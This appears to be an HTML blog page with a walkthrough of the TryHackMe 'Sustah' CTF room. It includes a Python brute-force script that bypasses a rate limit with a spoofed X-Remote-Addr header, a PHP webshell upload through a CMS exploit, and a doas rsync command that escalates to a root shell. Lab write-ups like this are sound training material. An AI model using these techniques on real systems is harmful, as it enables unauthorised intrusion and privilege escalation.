@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Sustah room TryHackMe writeup">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Sustah TryHackMe Writeup"/>
+<meta name="twitter:description" content="Sustah room TryHackMe writeup"/>
+
+    <meta property="og:title" content="Sustah TryHackMe Writeup" />
+<meta property="og:description" content="Sustah room TryHackMe writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/sustah/" />
+<meta property="article:published_time" content="2021-01-30T00:00:00+05:30" />
+<meta property="article:modified_time" content="2021-01-30T00:00:00+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chocolatefactory/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/battery/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/overpass3/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chill_hack/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/unbaked_pie/" />
+
+
+
+    <title>
+  Sustah TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/sustah/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Sustah TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-01-30T00:00:00&#43;05:30'>
+                January 30, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/tryhackme/">tryhackme</a>
+      <span class="separator">•</span>
+    <a href="/tags/medium_box/">medium_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="sustahhttpstryhackmecomroomsustah-tryhackme-wirteup"><a href="https://tryhackme.com/room/sustah">Sustah</a> TryHackMe Wirteup</h1>
+<p><img src="/TryHackMe/Sustah/BoxImage.jpeg" alt=""></p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>So as usual let&rsquo;s fire up nmap.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Sat Jan 30 13:48:26 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.95.49
+Warning: 10.10.95.49 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.95.49
+Host is up, received syn-ack (0.16s latency).
+Scanned at 2021-01-30 13:48:27 IST for 877s
+Not shown: 65531 closed ports
+Reason: 65531 conn-refused
+PORT     STATE    SERVICE REASON      VERSION
+22/tcp   open     ssh     syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7zuGtMGKQdFrh6Y8Dgwdo7815klLm7VzG05KNvT112MyF41Vxz+915iRz9nTSQ583i1cmjHp+q+fMq+QGiO0iwIdYN72jop6oFxqyaO2ZjBE3grWHSP2xMsTZc7qXgPu9ZxzVAfc/4mETA8B00yc6XNApJUwfJOYz/qt/pb0WHDVBQLYesg+rrr3UZDrj9L7KNFlW74mT0nzace0yqtcV//dgOMiG8CeS6TRyUG6clbSUdr+yfgPOrcUwhTCMRKv2e30T5naBZ60e1jSuXYmQfmeZtDZ4hdsBWDfOnGnw89O9Ak+VhULGYq/ZxTh31dnWBULftw/l6saLaUJEaVeb
+|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENNM4XJDFEnfvomDQgg0n7ZF+bHK+/x0EYcjrLP2BGgytEp7yg7A36KajE2QYkQKtHGPamSRLzNWmJpwzaV65w=
+|   256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOd1NxUo0xJ3krpRI1Xm8KMCFXziZngofs/wjOkofKKV
+80/tcp   open     http    syn-ack     Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Susta
+1472/tcp filtered csdm    no-response
+8085/tcp open     http    syn-ack     Gunicorn 20.0.4
+| http-methods: 
+|_  Supported Methods: HEAD POST GET OPTIONS
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Spinner
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan 30 14:03:04 2021 -- 1 IP address (1 host up) scanned in 878.90 seconds
+</code></pre></div><p>So the ports that which are open :</p>
+<ul>
+<li>22</li>
+<li>80</li>
+<li>1472</li>
+<li>8085</li>
+</ul>
+<p>Let&rsquo;s visit port 80.</p>
+<p><img src="/TryHackMe/Sustah/port80.png" alt=""></p>
+<p>I ran gobuster and nikto got nothing interesting.</p>
+<p>Hence I visited 8085 .</p>
+<p><img src="/TryHackMe/Sustah/port8085.png" alt=""></p>
+<p>So we have to guess the number in order to get the path.</p>
+<p>I used burp to intercept the request.</p>
+<p>And I tried bruteforcing the numbers but after sometime there was a limit which was stopping from bruteforcing.</p>
+<p>Hence I searced &ldquo;bypassing rate limits&rdquo; and found this blog in <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">HackTricks</a> and tried this header <strong>X-Remote-Addr: 127.0.0.1</strong> and it worked.</p>
+<p>So I sent it to intruder and set the payload from <strong>10000</strong> to <strong>99999</strong> step 1.</p>
+<p>After sometime I understood that it is taking long to complete , hence I created a python script to do this fast.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> requests
+<span style="color:#fff;font-weight:bold">import</span> sys
+<span style="color:#fff;font-weight:bold">import</span> re
+url = <span style="color:#0ff;font-weight:bold">&#34;http://10.10.95.49:8085/&#34;</span>
+
+sess = requests.session()
+<span style="color:#fff;font-weight:bold">for</span> number in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">10000</span>,<span style="color:#ff0;font-weight:bold">99999</span>):
+   header_data= {<span style="color:#0ff;font-weight:bold">&#34;X-Remote-Addr&#34;</span> : <span style="color:#0ff;font-weight:bold">&#34;127.0.0.1&#34;</span>}
+   data = {<span style="color:#0ff;font-weight:bold">&#34;number&#34;</span> : number}
+   output = sess.post(url, headers = header_data, data = data)
+   <span style="color:#fff;font-weight:bold">if</span> <span style="color:#0ff;font-weight:bold">&#34;rate limit exceeded&#34;</span> in output.text:
+        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;limit exceeded&#34;</span>)
+   <span style="color:#fff;font-weight:bold">elif</span> <span style="color:#0ff;font-weight:bold">&#34;Oh no! How unlucky. Spin the wheel and try again.&#34;</span> in output.text:
+        <span style="color:#fff;font-weight:bold">pass</span>
+   <span style="color:#fff;font-weight:bold">else</span>:
+        <span style="color:#fff;font-weight:bold">print</span>(f<span style="color:#0ff;font-weight:bold">&#34;[+]The number is {number}&#34;</span>)
+        sys.exit(<span style="color:#ff0;font-weight:bold">0</span>)
+
+</code></pre></div><p>Hence I ran the script and got the number.</p>
+<p><img src="/TryHackMe/Sustah/number.png" alt=""></p>
+<p>After we enter the number we got it gives us the directory.</p>
+<blockquote>
+<p>Note : the cms is in port 80</p>
+</blockquote>
+<h2 id="__second-stage--initial-access-as-www-data__"><strong>Second Stage : Initial access as www-data</strong></h2>
+<p>Hence we visit it</p>
+<p><img src="/TryHackMe/Sustah/path.png" alt=""></p>
+<p>So the name of cms is <strong>MARA</strong></p>
+<p>Hence I search for exploits using searchsploit and found this.</p>
+<p><img src="/TryHackMe/Sustah/exploit.png" alt=""></p>
+<p>So there is an  authenticated RCE , but we don&rsquo;t know the password. I tried the password given in exploit and it worked.</p>
+<p><img src="/TryHackMe/Sustah/admin.png" alt=""></p>
+<p>As given in the exploit we go to <strong>http://target/codebase/dir.php?type=filenew</strong></p>
+<p><img src="/TryHackMe/Sustah/uploading.png" alt=""></p>
+<p>And upload our shell.php.</p>
+<p>We get this message.</p>
+<p><img src="/TryHackMe/Sustah/uploaded.png" alt=""></p>
+<p>Hence we start a listener.</p>
+<p>Go to</p>
+<blockquote>
+<p>http://target/img/shell.php</p>
+</blockquote>
+<p>We get a shell.</p>
+<p><img src="/TryHackMe/Sustah/wwwdata.png" alt=""></p>
+<h2 id="__fourth-stage--www-data-to-kiran__"><strong>Fourth Stage : www-data to kiran</strong></h2>
+<p>I ran linpeas and got some hashes in <strong>/var/www/html/sitecfg</strong></p>
+<p>But they were a dead end, hence I saw the hint . So I went for /var/backups directory.</p>
+<p><img src="/TryHackMe/Sustah/passwd.png" alt=""></p>
+<p>I found the password in <strong>.bak.passwd</strong></p>
+<p>Now we get shell as <strong>kiran</strong></p>
+<h2 id="__fifth-stage--kiran-to-root__"><strong>Fifth Stage : kiran to root</strong></h2>
+<p>As soon as I ran linpeas this got my eyes.</p>
+<p><img src="/TryHackMe/Sustah/doas.png" alt=""></p>
+<p>So I searched for rsync in <a href="https://gtfobins.github.io/gtfobins/rsync/">GTFOBINS</a> . In order to get root .</p>
+<blockquote>
+<p>doas rsync -e &lsquo;sh -c &ldquo;sh 0&lt;&amp;2 1&gt;&amp;2&rdquo;&rsquo; 127.0.0.1:/dev/null</p>
+</blockquote>
+<p>And got root.</p>
+<p><img src="/TryHackMe/Sustah/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chocolatefactory/">ChocolateFactory TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/battery/">Battery TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/overpass3/">Overpass3 TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chill_hack/">Chill Hack TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/unbaked_pie/">Unbaked Pie TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
